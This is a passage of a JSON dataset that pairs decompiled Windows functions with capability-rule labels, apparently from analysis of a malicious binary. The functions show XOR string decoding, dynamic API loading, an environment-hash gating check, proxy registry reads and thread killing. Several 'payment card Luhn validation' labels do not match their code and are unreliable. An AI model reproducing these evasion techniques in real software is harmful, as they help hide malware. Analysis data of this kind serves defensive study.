   }\n    var_64h[0] = 0x30;\n    var_64h[1] = 0xb;\n    var_64h[2] = 0x5c;\n    var_64h[3] = 0x16;\n    var_60h = 10;\n    var_5fh = 0x70;\n    var_5eh = 0x1b;\n    var_5dh = 6;\n    var_5ch = 0x5a;\n    var_5bh = 0xf;\n    var_5ah = 0x12;\n    var_59h = 0x50;\n    var_58h = 0x26;\n    var_57h = 0x1b;\n    var_56h = 0x6e;\n    var_55h = 0x7a;\n    var_3ch[0] = 99;\n    var_3ch[1] = 99;\n    var_3ch[2] = 0x39;\n    var_3ch[3] = 0x7a;\n    var_38h = 0x66;\n    var_37h = 0x35;\n    fcn.004012a0(0x10);\n    for (var_14h = 0; var_14h < 0x10; var_14h = var_14h + 1) {\n        fcn.00401280(var_14h, var_64h[var_14h] ^ var_3ch[var_14h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    var_d4h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    while( true ) {\n        var_114h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar2 = (*var_d4h)(&var_11ch);\n        if ((iVar2 != 0) || (var_d8h = (*_sym.imp.KERNEL32.dll_GetLastError)(),  var_d8h != 0x4c7)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    var_d0h = 1;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_d0h;\n}\n",
        "token_count": 4140
    },
    "004212a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004212a0(void)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(var_4h * 4 + 0x436bc0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(var_4h * 4 + 0x436bc0));\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00421570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00421570(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpString;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uchar var_10h;\n    uint var_ch;\n    uchar var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    puVar3 = &lpString;\n    for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_1ch._0_1_ = 0x5b;\n    var_1ch._1_1_ = 0x10;\n    var_1ch._2_1_ = 0x31;\n    var_1ch._3_1_ = 0x5b;\n    var_18h = 0x52;\n    var_17h = 0x55;\n    var_16h = 7;\n    var_15h = 0x3f;\n    var_14h = 0x54;\n    var_13h = 0x56;\n    var_12h = 0x54;\n    var_11h = 0xd;\n    var_10h = 0x50;\n    var_ch._0_1_ = 0x38;\n    var_ch._1_1_ = 0x62;\n    var_ch._2_1_ = 0x50;\n    var_ch._3_1_ = 0x38;\n    var_8h = 0x39;\n    fcn.004012a0(0xd);\n    for (var_4h = 0; var_4h < 0xd; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_1ch + var_4h) ^ *(&var_ch + var_4h % 5));\n    }\n    uVar1 = fcn.00401270(&lpString, 0x104);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar2 = fcn.0041ff90(&lpString, uVar1);\n        if (iVar2 == -0x69b4c9f2) {\n            var_24h = 1;\n        }\n    }\n    var_28h = var_24h;\n    fcn.004012d0();\n    return var_28h;\n}\n",
        "token_count": 693
    },
    "00423a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423a00(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while( true ) {\n        if (arg_14h - arg_ch <= var_4h) {\n            return 0;\n        }\n        iVar1 = fcn.00424590(arg_10h + var_4h, arg_8h, arg_ch);\n        if (iVar1 == 0) break;\n        var_4h = var_4h + 1;\n    }\n    return arg_10h + var_4h;\n}\n",
        "token_count": 166
    },
    "00415930": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.00415930(void)\n\n{\n    int32_t iVar1;\n    \n    while (iVar1 = fcn.00414690(),  iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.004150f0();\n    return 0;\n}\n",
        "token_count": 72
    },
    "null": {
        "rules": [
            "create thread",
            "terminate thread"
        ],
        "decompiled_code": "\nuint entry0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0041a400, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0);\n    (*_sym.imp.KERNEL32.dll_TerminateThread)(uVar1);\n    return 0;\n}\n",
        "token_count": 111
    },
    "00413800": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00413800(uint name, uint lpValueName, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint namelen;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, name, &namelen);\n    if (uVar1 == 0) {\n        var_10h = 1;\n        var_ch = arg_14h;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, lpValueName, 0, &var_10h, arg_10h, &var_ch);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n        var_1h._0_1_ = 1;\n    }\n    return uVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 272
    },
    "00422e40": {
        "rules": [
            "create or open registry key",
            "get proxy"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nbool __cdecl fcn.00422e40(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    var_4h = 0;\n    *arg_8h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, 0x425910, 0, 0x20019, &var_4h, 0, 0);\n    if (iVar1 == 0) {\n        fcn.00422da0(var_4h, L\"ProxyServer\", arg_8h);\n        fcn.00422da0(var_4h, L\"ProxyOverride\", arg_ch);\n        fcn.00422da0(var_4h, L\"AutoConfigURL\", arg_10h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 270
    },
    "00413fe0": {
        "rules": [
            "delete registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00413fe0(uint hKey, uint lpValueName)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, lpValueName);\n    return iVar1 == 0;\n}\n",
        "token_count": 70
    }
}